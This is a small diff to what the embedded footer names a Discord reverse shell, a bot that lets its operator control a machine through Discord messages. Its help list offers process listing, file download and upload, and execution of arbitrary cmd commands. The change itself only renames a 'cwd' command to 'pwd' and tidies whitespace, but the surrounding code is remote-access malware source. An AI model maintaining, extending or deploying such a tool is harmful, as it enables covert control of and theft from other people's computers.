@@ -167,7 +167,7 @@ commands = "\n\r".join([
     "processes - Get all running processes",
     "cd - Change directory",
     "ls - List directory",
-    "cwd - Get current working directory",
+    "pwd - Get current working directory",
     "download <file> - Download file",
     "upload <link> - Upload file",
     "cmd <command> - Execute cmd command",
@@ -501,8 +501,8 @@ async def on_message(message):
 
 
 #! CWD    
-    elif message.content == "cwd":
-        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
+    elif message.content == "pwd":
+        embed = discord.Embed(title="PWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
@@ -1080,7 +1080,7 @@ async def on_message(message):
     elif message.content.startswith("tree"):
 
         path = os.getcwd() if not message.content[5:] else message.content[5:]
-        
+
         if not os.path.isdir(path): 
             await message.reply("Invalid path!")
             return
